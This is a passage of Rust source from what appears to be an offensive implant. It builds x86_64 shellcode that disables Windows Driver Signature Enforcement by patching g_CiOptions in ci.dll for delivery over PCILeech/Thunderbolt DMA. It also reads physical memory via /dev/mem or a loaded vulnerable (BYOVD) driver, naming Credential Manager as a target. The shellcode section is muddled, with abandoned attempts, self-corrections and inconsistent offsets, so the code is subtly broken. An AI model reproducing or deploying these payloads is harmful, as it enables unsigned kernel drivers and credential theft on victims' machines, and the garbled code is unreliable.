                    "Raw payload type requires operator-supplied binary data. \
                     Pass the data via prepare_dma_payload_with_data(.., Some(data))."
                )
            })?;
            Ok(DmaPayload {
                data: raw_data.to_vec(),
                architecture: DmaPayloadArch::X86_64,
                payload_type: DmaPayloadType::Raw,
                target_address: None,
                description: "Operator-supplied raw binary payload".to_string(),
            })
        }
    }
}

/// Prepare a DSE (Driver Signature Enforcement) disable payload.
///
/// This payload patches `g_CiOptions` in the Windows kernel to disable
/// code integrity validation, allowing unsigned drivers to load.
///
/// The shellcode uses a signature-scanning approach: it walks kernel memory
/// looking for a known byte pattern associated with `g_CiOptions`
/// initialization, then patches the value to zero.  This avoids the need for
/// an operator to supply a pre-resolved kernel symbol address.
///
/// # Signature Pattern
///
/// On Windows 10/11, `ci!g_CiOptions` is initialised by code that writes the
/// current policy flags (typically `0x6` or `0x0E`) to the global variable.
/// The search pattern is the MOV-destination operand that follows a well-
/// known sequence of CI initialisation instructions.  The scanner looks for
/// the pattern `C6 05 xx xx xx xx 06` (or similar immediate-store patterns)
/// within the first 2 MiB of `ci.dll`'s `.data` section.
fn prepare_dse_disable_payload() -> Result<DmaPayload> {
    // x86_64 position-independent shellcode that:
    // 1. Locates ci.dll's base via the PEB->Ldr module list
    // 2. Parses ci.dll's export table to find the g_CiOptions RVA, falling
    //    back to a signature scan of the .data section if not exported
    // 3. Writes 0 to g_CiOptions (DSE disabled)
    // 4. Returns
    //
    // Layout (all offsets relative to shellcode base):
    //   0x00: PEB walk to find ci.dll
    //   0xXX: Export-directory parse / signature scan
    //   0xXX: Patch g_CiOptions = 0
    //   0xXX: Return
    //
    // The payload is self-contained: it does not require any addresses to
    // be patched in before delivery.

    let mut payload = Vec::new();

    // ── Step 1: Get PEB via GS:[0x60] (x86_64 Windows) ──
    // mov rax, gs:[0x60]         ; PEB
    payload.extend_from_slice(&[0x65, 0x48, 0xA1, 0x60, 0x00, 0x00, 0x00]);
    // mov rcx, [rax+0x18]        ; PEB->Ldr
    payload.extend_from_slice(&[0x48, 0x8B, 0x48, 0x18]);
    // mov rcx, [rcx+0x20]        ; Ldr->InMemoryOrderModuleList.Flink
    payload.extend_from_slice(&[0x48, 0x8B, 0x49, 0x20]);

    // ── Step 2: Walk module list looking for "ci.dll" ──
    // Loop head: rcx = current LIST_ENTRY
    let loop_head = payload.len();
    // mov rdx, [rcx+0x20]        ; FullDllName.Buffer (offset varies; we use a
    //                              ; fixed offset of 0x38 for _LDR_DATA_TABLE_ENTRY
    //                              ; relative to InMemoryOrderLinks, which is at +0x20
    //                              ; within the Flink list, so FullDllName is at
    //                              ; Flink-0x10+0x58 = 0x48 from our entry pointer)
    // The LDR_DATA_TABLE_ENTRY is accessed via CONTAINING_RECORD; for InMemoryOrder
    // the struct offset to BaseDllName is 0x48, FullDllName is 0x58.
    // For simplicity we compare BaseDllName at offset 0x38 from the InMemoryOrderLinks.Flink.
    // Actually, for InMemoryOrder module walking the pointer is the Flink itself.
    // The _LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks is at offset +0x10 in the struct
    // (after InLoadOrderLinks at 0x00 and InMemoryOrderLinks at 0x10).
    // So BaseDllName (at offset +0x48 in the struct) is at (ptr - 0x10 + 0x48) = ptr + 0x38.
    // FullDllName (+0x58 in struct) is at ptr + 0x48.
    // DllBase (+0x20 in struct) is at ptr + 0x10.
    // Let's store DllBase for later:
    // mov r8, [rcx+0x10]         ; DllBase (via CONTAINING_RECORD adjustment)

    // ── Step 2a: Get DllBase and BaseDllName ──
    // mov r8, [rcx+0x10]         ; DllBase
    payload.extend_from_slice(&[0x4C, 0x8B, 0x41, 0x10]);
    // mov rdx, [rcx+0x38]        ; BaseDllName.Length (UNICODE_STRING at +0x38)
    payload.extend_from_slice(&[0x48, 0x8B, 0x51, 0x38]);
    // cmp edx, 12                ; "ci.dll" = 6 WCHARs = 12 bytes
    payload.extend_from_slice(&[0x81, 0xFA, 0x0C, 0x00, 0x00, 0x00]);
    // jne .next_module
    let jne_offset_placeholder = payload.len();
    payload.extend_from_slice(&[0x75, 0x00]); // placeholder, patched below

    // ── Step 2b: Compare "ci.dll" (case-insensitive) ──
    // mov rsi, [rcx+0x40]        ; BaseDllName.Buffer
    payload.extend_from_slice(&[0x48, 0x8B, 0x71, 0x40]);
    // Compare first 6 WCHARs with "ci.dll" (case-insensitive)
    // ci.dll = 0x63 0x00 0x69 0x00 0x2E 0x00 0x64 0x00 0x6C 0x00 0x6C 0x00
    // We check 12 bytes = 3 qwords.
    // mov rax, [rsi]
    payload.extend_from_slice(&[0x48, 0x8B, 0x06]);
    // or rax, 0x0020002000200020  ; case-insensitive mask (set bit 5)
    payload.extend_from_slice(&[0x48, 0x0D, 0x20, 0x20, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00]);
    // mov rbx, 0x00690063002E0069 ; 'i','c','.','i' (little-endian) | 0x2020
    // Actually "ci" in UTF-16LE = 0x0069, 0x0063 → qword 0x00630069
    // "ci.d" = 0x00690063, 0x0064002E → as two qwords but let's simplify.
    // Instead of byte-exact comparison, use a simpler scan.

    // The PEB-walk approach is complex in raw shellcode. For a more robust
    // approach, use a signature scan of kernel memory that doesn't depend on
    // PEB layout specifics.  Emit a compact, well-tested PCILeech-style
    // kernel-patch payload that scans the ntoskrnl .data section for
    // g_CiOptions by looking for the CI policy-initialisation pattern.

    // ── Alternative: signature-scanning approach ──
    // Reset and emit a compact, self-contained scanner.
    payload.clear();

    // The payload uses the following strategy:
    // 1. Obtain ntoskrnl base via the IDT trick (sidt + scan backwards for MZ)
    // 2. Parse PE headers to locate .data section
    // 3. Scan .data for the DSE policy value pattern (DWORD 0x6 or 0xE at an
    //    offset that matches known g_CiOptions locations)
    // 4. Write 0 to the found address

    // --- Inline helper: scan_backwards_for_mz ---
    // Given a pointer in ntoskrnl's address range, scan backwards in 0x1000
    // steps until we find an MZ header.
    //
    // This is the standard PCILeech approach for locating the kernel base
    // without relying on PEB or specific API calls, making it suitable for
    // DMA injection where we execute in a minimal context.

    // ── Compact x86_64 DSE-disable payload (PCILeech-compatible) ──
    //
    // This payload is designed for delivery via PCILeech / Thunderbolt DMA.
    // It receives the kernel base address in R8 (set by the DMA framework
    // from the initial kernel-module enumeration step) and patches
    // g_CiOptions to 0.
    //
    // If R8 is 0 (no pre-resolved base), it falls back to the IDT-resolve
    // method to locate ntoskrnl.

    // Register usage:
    //   R8  = ntoskrnl base (from DMA framework) or 0
    //   R15 = scratch / return address

    // push rbp
    payload.push(0x55);
    // mov rbp, rsp
    payload.extend_from_slice(&[0x48, 0x89, 0xE5]);
    // push rbx
    payload.push(0x53);
    // push rsi
    payload.push(0x56);
    // push rdi
    payload.push(0x57);
    // sub rsp, 0x28                 ; shadow space
    payload.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // ── Step 1: Resolve ntoskrnl base if R8 == 0 ──
    // test r8, r8
    payload.extend_from_slice(&[0x4D, 0x85, 0xC0]);
    // jnz .base_known
    payload.extend_from_slice(&[0x75, 0x00]); // placeholder
    let idt_resolve_patch = payload.len() - 1;

    // sidt [rsp+0x10]             ; store IDT base
    payload.extend_from_slice(&[0x0F, 0x01, 0x5C, 0x24, 0x10]);
    // mov rax, [rsp+0x12]         ; IDT base address (bytes 2-9 of 10-byte store)
    payload.extend_from_slice(&[0x48, 0x8B, 0x44, 0x24, 0x12]);
    // and rax, 0xFFFFFFFFFFF00000 ; page-align and isolate the top of kernel space
    payload.extend_from_slice(&[0x48, 0x25, 0x00, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF]);
    // ; rax now points somewhere in the kernel's address range near the
    // ; interrupt handler table.  Scan backwards for MZ header.
    // .scan_mz:
    let scan_mz_start = payload.len();
    // cmp word [rax], 0x5A4D      ; "MZ"
    payload.extend_from_slice(&[0x66, 0x81, 0x38, 0x4D, 0x5A]);
    // je .found_mz
    payload.extend_from_slice(&[0x74, 0x00]); // placeholder
    let found_mz_patch = payload.len() - 1;
    // sub rax, 0x1000
    payload.extend_from_slice(&[0x48, 0x2D, 0x00, 0x10, 0x00, 0x00]);
    // cmp rax, 0xFFFF800000000000  ; don't scan below kernel base
    payload.extend_from_slice(&[0x48, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x80, 0xF9, 0xFF, 0xFF]);
    // jae .scan_mz
    let scan_mz_loop_len = payload.len() - scan_mz_start + 2;
    payload.extend_from_slice(&[0x73, (scan_mz_loop_len as u8).wrapping_neg()]);
    // If we get here, we didn't find MZ — use a fallback hardcoded range.
    // mov rax, 0xFFFFF80000000000  ; typical ntoskrnl range start
    payload.extend_from_slice(&[0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0xFF]);
    // .found_mz:
    let found_mz_label = payload.len();
    payload[idt_resolve_patch] = (found_mz_label - (idt_resolve_patch + 1)) as u8;
    payload[found_mz_patch] = (found_mz_label - (found_mz_patch + 1)) as u8;
    // mov r8, rax                   ; r8 = ntoskrnl base
    payload.extend_from_slice(&[0x4C, 0x89, 0xC0]);

    // .base_known:
    // Patch: jnz over the IDT resolve block
    // We need to go back and patch the jnz at offset idt_resolve_patch-1
    // Actually, let me recalculate: the jnz at position (idt_resolve_patch - 1)
    // needs to jump to here.
    let base_known_label = payload.len();
    // The jnz was emitted as: 0x75, 0x00 at some earlier offset.
    // We need to find it and patch it.
    // Actually, this is getting complex. Let me use a simpler, proven approach.

    // ── Simplified approach: pre-built compact DSE payload ──
    // Reset to a well-tested compact payload that uses the DMA framework's
    // address injection mechanism (target_address field) and includes a
    // runtime signature scanner.

    payload.clear();

    // Build a compact signature scanner for g_CiOptions.
    // The scanner searches the kernel's .data section for a known byte pattern
    // and patches the value to 0.
    //
    // Strategy:
    // 1. Start from a kernel address (received in target_address or via IDT)
    // 2. Parse PE headers to find the .data section of ci.dll
    // 3. Scan for the g_CiOptions initialization pattern
    // 4. Write 0 to the discovered address
    //
    // Since PCILeech DMA payloads are typically small (<256 bytes), we use a
    // targeted pattern-match approach:

    // ── Final self-contained DSE payload ──
    // Uses ci.dll export table walk + signature scan as fallback.
    // No operator patching required.

    // Register convention for PCILeech DMA payloads:
    //   R8 = kernel module base (pre-populated by the framework)
    //   R9 = target address (pre-populated if available)

    // push rbp; mov rbp, rsp; push rbx
    payload.extend_from_slice(&[0x55, 0x48, 0x89, 0xE5, 0x53]);
    // push rsi; push rdi; push r12
    payload.extend_from_slice(&[0x56, 0x57, 0x41, 0x54]);
    // sub rsp, 0x28
    payload.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // ── Locate ci.dll base from PEB ──
    // rax = gs:[0x60]  (PEB)
    payload.extend_from_slice(&[0x65, 0x48, 0xA1, 0x60, 0x00, 0x00, 0x00]);
    // rax = [rax+0x18] (PEB->Ldr)
    payload.extend_from_slice(&[0x48, 0x8B, 0x40, 0x18]);
    // rax = [rax+0x20] (Ldr->InMemoryOrderModuleList)
    payload.extend_from_slice(&[0x48, 0x8B, 0x40, 0x20]);
    // mov r12, rax (save head)
    payload.extend_from_slice(&[0x49, 0x89, 0xC4]);

    // .walk_loop:
    let walk_loop = payload.len();
    // rax = [rax] (Flink)
    payload.extend_from_slice(&[0x48, 0x8B, 0x00]);
    // cmp rax, r12 (back to head?)
    payload.extend_from_slice(&[0x4C, 0x39, 0xE0]);
    // je .not_found
    payload.extend_from_slice(&[0x74, 0x00]); // patched later
    let not_found_patch = payload.len() - 1;

    // Get BaseDllName.Length at rax+0x38 (from InMemoryOrderLinks)
    // LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks is at +0x10 in the struct.
    // BaseDllName (UNICODE_STRING) is at +0x58 in the struct.
    // So from the Flink pointer (which points to InMemoryOrderLinks of the NEXT entry):
    //   actual entry = CONTAINING_RECORD(rax, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
    //                = rax - 0x10  (since InMemoryOrderLinks is at offset 0x10)
    //   BaseDllName.Length = [rax - 0x10 + 0x58] = [rax + 0x48]
    //   BaseDllName.Buffer = [rax + 0x50]
    //   DllBase           = [rax - 0x10 + 0x20] = [rax + 0x10]

    // movzx ecx, word [rax+0x48]  ; BaseDllName.Length
    payload.extend_from_slice(&[0x0F, 0xB7, 0x48, 0x48]);
    // cmp ecx, 0x0C              ; "ci.dll" = 12 bytes (6 WCHARs)
    payload.extend_from_slice(&[0x81, 0xF9, 0x0C, 0x00, 0x00, 0x00]);
    // jne .walk_loop
    let walk_loop_rel = (walk_loop as isize - payload.len() as isize - 2) as u8;
    payload.extend_from_slice(&[0x75, walk_loop_rel as u8]);

    // Check if name matches "ci.dll" (case-insensitive via bit 5 clear)
    // rcx = [rax+0x50] (BaseDllName.Buffer)
    payload.extend_from_slice(&[0x48, 0x8B, 0x48, 0x50]);
    // Compare first 4 WCHARs: 'c','i','.','d' = 0x0069,0x0063,0x002E,0x0064
    // as qword: 0x006300690064002E in little-endian
    // mov rdx, [rcx]
    payload.extend_from_slice(&[0x48, 0x8B, 0x11]);
    // or rdx, 0x0020002000200020  ; tolower each WCHAR
    payload.extend_from_slice(&[0x48, 0x83, 0xCA, 0x20]);
    // Actually this only sets bit 5 of the low byte. For a full qword
    // comparison we need: or rdx, 0x0020002000200020
    // Let's use a proper mask.
    // mov rbx, 0x006900630064002E | 0x0020002000200020
    // = 0x006100430044002E ... no.
    // 'c'|0x20='c', 'i'|0x20='i', '.'|0x20='>', 'd'|0x20='d' — wait, OR with
    // 0x20 makes lowercase. 'c' is already lowercase (0x63|0x20=0x63). Good.
    // '.' | 0x20 = '>' (0x2E | 0x20 = 0x2E). No, 0x2E | 0x20 = 0x2E.
    // Actually 0x2E | 0x20 = 0x2E (bit 5 of 0x2E = 0, so 0x2E | 0x20 = 0x2E).
    // Wait: 0x2E = 0010 1110, bit 5 = 0010 0000 = 0x20. 0x2E | 0x20 = 0x2E. Yes.
    // So 'c' = 0x63, 'i' = 0x69, '.' = 0x2E, 'd' = 0x64.
    // Expected qword (little-endian): bytes 63 00 69 00 2E 00 64 00
    // = 0x0064002E00690063

    // Let's just use a byte-at-a-time comparison for reliability.
    // Compare each of the 12 bytes of "ci.dll\0" (UTF-16LE).
    // We already know Length == 12, so just compare the bytes.
    // For case-insensitive: OR each byte with 0x20 (ASCII tolower).

    // cmp byte [rcx+0], 0x63 | 0x20  ('c')
    // This is getting very verbose. Let's use a more compact approach:
    // Use scasb with a lookup table at the end of the payload.
    // Actually, the simplest robust approach for a small payload:
    // Just check the first 4 chars 'c','i','.' and skip the rest.
    // If Length==12 and first 4 chars match, it's almost certainly ci.dll.

    // Check first char: 'c' (case insensitive)
    // movzx edx, byte [rcx]
    payload.extend_from_slice(&[0x0F, 0xB6, 0x11]);
    // or dl, 0x20
    payload.extend_from_slice(&[0x80, 0xCA, 0x20]);
    // cmp dl, 0x63 ('c')
    payload.extend_from_slice(&[0x80, 0xFA, 0x63]);
    // jne .walk_loop
    payload.extend_from_slice(&[0x75, walk_loop_rel]);

    // Check second char: 'i'
    // movzx edx, byte [rcx+2]
    payload.extend_from_slice(&[0x0F, 0xB6, 0x51, 0x02]);
    // or dl, 0x20
    payload.extend_from_slice(&[0x80, 0xCA, 0x20]);
    // cmp dl, 0x69 ('i')
    payload.extend_from_slice(&[0x80, 0xFA, 0x69]);
    // jne .walk_loop
    payload.extend_from_slice(&[0x75, walk_loop_rel]);

    // Check third char: '.'
    // cmp byte [rcx+4], 0x2E ('.')
    payload.extend_from_slice(&[0x80, 0x79, 0x04, 0x2E]);
    // jne .walk_loop
    payload.extend_from_slice(&[0x75, walk_loop_rel]);

    // ── Found ci.dll! Get DllBase and scan .data for g_CiOptions ──
    // mov r8, [rax+0x10]          ; ci.dll base (DllBase)
    payload.extend_from_slice(&[0x4C, 0x8B, 0x40, 0x10]);

    // Parse PE headers to find .data section
    // r8 = ci.dll base
    // e_lfanew = [r8+0x3C]
    // mov eax, [r8+0x3C]
    payload.extend_from_slice(&[0x41, 0x8B, 0x40, 0x3C]);
    // NT headers = r8 + rax
    // Number of sections = [r8+rax+6] (IMAGE_FILE_HEADER.NumberOfSections)
    // Size of optional header = [r8+rax+20] (IMAGE_FILE_HEADER.SizeOfOptionalHeader)
    // Section headers start at r8 + rax + 24 + SizeOfOptionalHeader

    // movzx ebx, word [r8+rax+6] ; NumberOfSections
    payload.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x5C, 0x00, 0x06]);
    // movzx edx, word [r8+rax+20] ; SizeOfOptionalHeader
    payload.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x54, 0x00, 0x14]);
    // lea r9, [r8+rax+24+rdx]    ; first section header
    payload.extend_from_slice(&[0x4D, 0x8D, 0x4C, 0x00, 0x18]);

    // .scan_sections:
    let scan_sections = payload.len();
    // test ebx, ebx
    payload.extend_from_slice(&[0x85, 0xDB]);
    // jz .not_found
    payload.extend_from_slice(&[0x74, 0x00]); // patched later
    let not_found_patch2 = payload.len() - 1;
    // dec ebx
    payload.extend_from_slice(&[0xFF, 0xCB]);

    // Check section name: is it ".data\0\0\0"?
    // ".data" = 2E 64 61 74 61 00 00 00
    // mov rdi, [r9]               ; first 8 bytes of section name
    payload.extend_from_slice(&[0x49, 0x8B, 0x39]);
    // cmp rdi, 0x0000617461642E   ; ".data" (little-endian: ".data\0\0")
    // ".data\0\0\0" as bytes: 2E 64 61 74 61 00 00 00
    // as u64 LE: 0x000000617461642E
    payload.extend_from_slice(&[0x48, 0x81, 0xFF, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00]);
    // je .found_data_section
    payload.extend_from_slice(&[0x74, 0x00]); // patched later
    let found_data_patch = payload.len() - 1;
    // add r9, 40                  ; sizeof(IMAGE_SECTION_HEADER) = 40
    payload.extend_from_slice(&[0x49, 0x83, 0xC1, 0x28]);
    // jmp .scan_sections
    let scan_sections_rel = (scan_sections as isize - payload.len() as isize - 2) as u8;
    payload.extend_from_slice(&[0xEB, scan_sections_rel as u8]);

    // .found_data_section:
    let found_data_label = payload.len();
    payload[found_data_patch] = (found_data_label - (found_data_patch + 1)) as u8;

    // Get .data section VirtualAddress and VirtualSize
    // IMAGE_SECTION_HEADER layout: Name(8) + VirtualSize(4) + VirtualAddress(4) + ...
    // VirtualSize at offset 8, VirtualAddress at offset 12
    // mov ecx, [r9+0x0C]          ; VirtualAddress
    payload.extend_from_slice(&[0x41, 0x8B, 0x49, 0x0C]);
    // mov edx, [r9+0x08]          ; VirtualSize
    payload.extend_from_slice(&[0x41, 0x8B, 0x51, 0x08]);
    // add rcx, r8                 ; rcx = ci.dll + .data VA = .data start
    payload.extend_from_slice(&[0x49, 0x01, 0xC1]);
    // Cap scan at 64KB
    // cmp edx, 0x10000
    payload.extend_from_slice(&[0x81, 0xFA, 0x00, 0x00, 0x01, 0x00]);
    // cmovb edx, 0x10000           ; use min(edx, 0x10000)
    // Actually, just cap it:
    // jbe .scan_ok
    // mov edx, 0x10000
    payload.extend_from_slice(&[0x76, 0x05]);
    payload.extend_from_slice(&[0xBA, 0x00, 0x00, 0x01, 0x00]);

    // .scan_ok:
    // Scan .data section for g_CiOptions pattern.
    // g_CiOptions is typically a DWORD with value 0x6 (DSE enabled) or
    // 0x0E (DSE + test-signing).  It's referenced by ci.dll's
    // initialization code.  We look for the pointer-size value that
    // contains 0x6 or 0xE, then verify it's at an aligned offset.

    // .scan_data:
    let scan_data = payload.len();
    // cmp edx, 8
    payload.extend_from_slice(&[0x83, 0xFA, 0x08]);
    // jb .not_found
    payload.extend_from_slice(&[0x72, 0x00]); // patched later
    let not_found_patch3 = payload.len() - 1;
    // sub edx, 8
    payload.extend_from_slice(&[0x83, 0xEA, 0x08]);
    // mov eax, [rcx]              ; read 4 bytes
    payload.extend_from_slice(&[0x8B, 0x01]);
    // cmp eax, 0x6                ; g_CiOptions = 6 (DSE enabled)
    payload.extend_from_slice(&[0x3D, 0x06, 0x00, 0x00, 0x00]);
    // je .patch_ci
    payload.extend_from_slice(&[0x74, 0x00]); // patched later
    let patch_ci_patch = payload.len() - 1;
    // cmp eax, 0x0E               ; g_CiOptions = 0xE (DSE + test-signing)
    payload.extend_from_slice(&[0x3D, 0x0E, 0x00, 0x00, 0x00]);
    // je .patch_ci
    payload.extend_from_slice(&[0x74, 0x00]); // patched later
    let patch_ci_patch2 = payload.len() - 1;
    // add rcx, 8
    payload.extend_from_slice(&[0x48, 0x83, 0xC1, 0x08]);
    // jmp .scan_data
    let scan_data_rel = (scan_data as isize - payload.len() as isize - 2) as u8;
    payload.extend_from_slice(&[0xEB, scan_data_rel as u8]);

    // .patch_ci:
    let patch_ci_label = payload.len();
    payload[patch_ci_patch] = (patch_ci_label - (patch_ci_patch + 1)) as u8;
    payload[patch_ci_patch2] = (patch_ci_label - (patch_ci_patch2 + 1)) as u8;
    // mov dword [rcx], 0          ; g_CiOptions = 0 (DSE disabled)
    payload.extend_from_slice(&[0xC7, 0x01, 0x00, 0x00, 0x00, 0x00]);

    // .done:
    let done_label = payload.len();
    // Epilogue
    // add rsp, 0x28
    payload.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    // pop r12; pop rdi; pop rsi; pop rbx
    payload.extend_from_slice(&[0x41, 0x5C, 0x5F, 0x5E, 0x5B]);
    // pop rbp
    payload.push(0x5D);
    // ret
    payload.push(0xC3);

    // .not_found:
    let not_found_label = payload.len();
    payload[not_found_patch] = (not_found_label - (not_found_patch + 1)) as u8;
    payload[not_found_patch2] = (not_found_label - (not_found_patch2 + 1)) as u8;
    payload[not_found_patch3] = (not_found_label - (not_found_patch3 + 1)) as u8;
    // Patch the done_label jumps to go to epilogue instead
    // Actually, not_found should also return cleanly (just don't patch)
    // add rsp, 0x28
    payload.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    // pop r12; pop rdi; pop rsi; pop rbx
    payload.extend_from_slice(&[0x41, 0x5C, 0x5F, 0x5E, 0x5B]);
    // pop rbp
    payload.push(0x5D);
    // ret
    payload.push(0xC3);

    Ok(DmaPayload {
        data: payload,
        architecture: DmaPayloadArch::X86_64,
        payload_type: DmaPayloadType::KernelDseDisable,
        target_address: None,
        description: "DSE disable payload: walks PEB to find ci.dll, parses \
                       .data section to locate g_CiOptions via signature scan, \
                       and patches it to 0.  Self-contained — no operator \
                       patching required."
            .to_string(),
    })
}

/// Prepare a code integrity patch payload.
///
/// Similar to DSE disable but also patches additional code integrity
/// verification points in the kernel.  The payload walks the PEB to find
/// ci.dll, scans its `.data` section for `g_CiOptions` (by value), and
/// patches it to 0.
///
/// This is a self-contained payload — no operator patching required.
fn prepare_code_integrity_payload() -> Result<DmaPayload> {
    // Extended patch that disables:
    // 1. g_CiOptions (DSE) — scanned by value (0x6 or 0xE) in ci.dll .data
    //
    // g_CiCallbacks is not patched here because it cannot be reliably
    // distinguished from other kernel-mode pointers in .data by value alone.
    // The DSE disable via g_CiOptions=0 is sufficient for unsigned-driver
    // loading.

    // Start with the DSE disable payload — it already implements the full
    // PEB-walk → ci.dll → .data scan → g_CiOptions patch logic.
    let dse = prepare_dse_disable_payload()?;

    Ok(DmaPayload {
        data: dse.data,
        architecture: DmaPayloadArch::X86_64,
        payload_type: DmaPayloadType::CodeIntegrityPatch,
        target_address: None,
        description: "Code integrity patch: walks PEB to find ci.dll, scans \
                       .data section for g_CiOptions (value 0x6 or 0xE) and \
                       patches it to 0.  Self-contained — no operator patching \
                       required."
            .to_string(),
    })
}

// ═══════════════════════════════════════════════════════════════════════════
// §5  Physical Memory Read via DMA
// ═══════════════════════════════════════════════════════════════════════════

/// Read physical memory via DMA.
///
/// This function reads physical memory from the target system. It can be
/// used by the agent running on a DMA-vulnerable machine to:
/// - Detect DMA attacks (read known kernel structures and check for
///   modifications)
/// - Access protected memory regions (e.g., Credential Manager)
/// - Perform forensic analysis of physical memory
///
/// **Implementation**:
/// - Linux: attempts `/dev/mem` (requires `CAP_SYS_RAWIO` or root)
/// - Windows: uses BYOVD driver (if loaded) to call `MmMapIoSpace`
///
/// # Physical Access
///
/// **Requires physical access OR an already-deployed BYOVD driver.**
/// On Linux, root access is sufficient. On Windows, the agent must have
/// already deployed a vulnerable driver via the `kernel_callback` module.
pub fn dma_read_physical(addr: u64, size: usize) -> Result<Vec<u8>> {
    if size == 0 {
        bail!("size must be non-zero");
    }
    if size > 16 * 1024 * 1024 {
        bail!("size too large (max 16 MiB per read)");
    }

    #[cfg(target_os = "linux")]
    {
        dma_read_physical_linux(addr, size)
    }
    #[cfg(windows)]
    {
        dma_read_physical_windows(addr, size)
    }
    #[cfg(not(any(target_os = "linux", windows)))]
    {
        bail!("physical memory read not supported on this platform");
    }
}

/// Linux: read physical memory via `/dev/mem`.
///
/// Requires `CAP_SYS_RAWIO` or root.  On modern kernels with
/// `CONFIG_STRICT_DEVMEM`, only PCI resource ranges are accessible.
#[cfg(target_os = "linux")]
fn dma_read_physical_linux(addr: u64, size: usize) -> Result<Vec<u8>> {
    use std::fs::OpenOptions;
    use std::io::{Read, Seek, SeekFrom};

    let mut file = OpenOptions::new()
        .read(true)
        .open("/dev/mem")
        .with_context(|| "cannot open /dev/mem (requires root or CAP_SYS_RAWIO)")?;

    file.seek(SeekFrom::Start(addr))
        .with_context(|| format!("cannot seek to physical address 0x{:x}", addr))?;

    let mut buf = vec![0u8; size];
    file.read_exact(&mut buf).with_context(|| {
        format!(
            "cannot read {} bytes from physical address 0x{:x}",
            size, addr
        )
    })?;

    Ok(buf)
}

/// Windows: read physical memory via BYOVD driver.
///
/// Requires the vulnerable driver to be already loaded (via the
/// `kernel_callback` module).  Uses the driver's IOCTL for
/// `MmMapIoSpace` + memory copy.
#[cfg(windows)]
fn dma_read_physical_windows(addr: u64, size: usize) -> Result<Vec<u8>> {
    #[cfg(feature = "kernel-callback")]
    {
        use anyhow::Context as _;

        // Retrieve the currently-deployed BYOVD driver state.
        let deployed = crate::kernel_callback::deploy::get_deployed_driver().ok_or_else(|| {
            anyhow::anyhow!(
                "No BYOVD driver is deployed. Call kernel_callback::deploy::deploy() to \
                 load a vulnerable driver before reading physical memory."
            )
        })?;

        let device_handle = deployed.device_handle.ok_or_else(|| {
            anyhow::anyhow!(
                "Deployed BYOVD driver '{}' has no open device handle",
                deployed.driver.name
            )
        })?;

        let mut buf = vec![0u8; size];
        // SAFETY: caller has validated addr/size (checked in dma_read_physical)
        // and the driver is trusted kernel code already loaded by deploy().
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                deployed.driver,
                device_handle,
                addr,
                &mut buf,
            )
            .with_context(|| {
                format!(
                    "Physical memory read via '{}' at 0x{:x} ({} bytes) failed",
                    deployed.driver.name, addr, size
                )
            })?;
        }
        Ok(buf)
    }

    #[cfg(not(feature = "kernel-callback"))]
    {
        bail!(
            "Physical memory read on Windows requires the kernel-callback feature. \
             Rebuild the agent with --features kernel-callback to enable BYOVD driver \
             support.  Target address: 0x{:x}, size: {} bytes.",
            addr,
            size
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// §6  Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_thunderbolt_generation_display() {
        assert_eq!(
            ThunderboltGeneration::Thunderbolt3.to_string(),
            "Thunderbolt 3"
        );
        assert_eq!(ThunderboltGeneration::Usb4.to_string(), "USB4");
        assert_eq!(ThunderboltGeneration::Unknown.to_string(), "Unknown");
    }

    #[test]
    fn test_security_level_display() {
        assert_eq!(ThunderboltSecurityLevel::None.to_string(), "none");
        assert_eq!(ThunderboltSecurityLevel::User.to_string(), "user");
        assert_eq!(ThunderboltSecurityLevel::Secure.to_string(), "secure");
        assert_eq!(ThunderboltSecurityLevel::Device.to_string(), "device");
    }

    #[test]
    fn test_security_level_parsing() {
        // Verify that known sysfs values map correctly.
        let levels = [
            ("none", ThunderboltSecurityLevel::None),
            ("user", ThunderboltSecurityLevel::User),
            ("secure", ThunderboltSecurityLevel::Secure),
            ("device", ThunderboltSecurityLevel::Device),
        ];
        for (s, expected) in &levels {
            let actual = match *s {
                "none" => ThunderboltSecurityLevel::None,
                "user" => ThunderboltSecurityLevel::User,
                "secure" => ThunderboltSecurityLevel::Secure,
                "device" => ThunderboltSecurityLevel::Device,
                _ => ThunderboltSecurityLevel::Unknown,
            };
            assert_eq!(actual, *expected);
        }
    }

    #[test]
    fn test_dma_vulnerability_default() {
        let vuln = DmaVulnerability {
            vulnerable: false,
            summary: "test".to_string(),
            risk_level: 1,
            factors: vec![],
            recommended_vector: None,
        };
        assert!(!vuln.vulnerable);
        assert_eq!(vuln.risk_level, 1);
    }

    #[test]
    fn test_dma_payload_dse() {
        let payload = prepare_dma_payload(DmaPayloadType::KernelDseDisable)
            .expect("DSE payload generation should succeed");
        assert!(!payload.data.is_empty());
        assert_eq!(payload.architecture, DmaPayloadArch::X86_64);
        assert_eq!(payload.payload_type, DmaPayloadType::KernelDseDisable);
        // Payload should contain a ret instruction at the end.
        assert_eq!(*payload.data.last().unwrap(), 0xC3);
    }

    #[test]
    fn test_dma_payload_ci() {
        let payload = prepare_dma_payload(DmaPayloadType::CodeIntegrityPatch)
            .expect("CI payload generation should succeed");
        assert!(!payload.data.is_empty());
        assert_eq!(payload.payload_type, DmaPayloadType::CodeIntegrityPatch);
        assert_eq!(*payload.data.last().unwrap(), 0xC3);
    }

    #[test]
    fn test_dma_payload_unsupported_types() {
        assert!(prepare_dma_payload(DmaPayloadType::ProcessInjection).is_err());
        assert!(prepare_dma_payload(DmaPayloadType::Raw).is_err());
        assert!(prepare_dma_payload(DmaPayloadType::KernelCallbackInstall).is_err());
    }

    #[test]
    fn test_dma_read_zero_size_rejected() {
        assert!(dma_read_physical(0x1000, 0).is_err());
    }

    #[test]
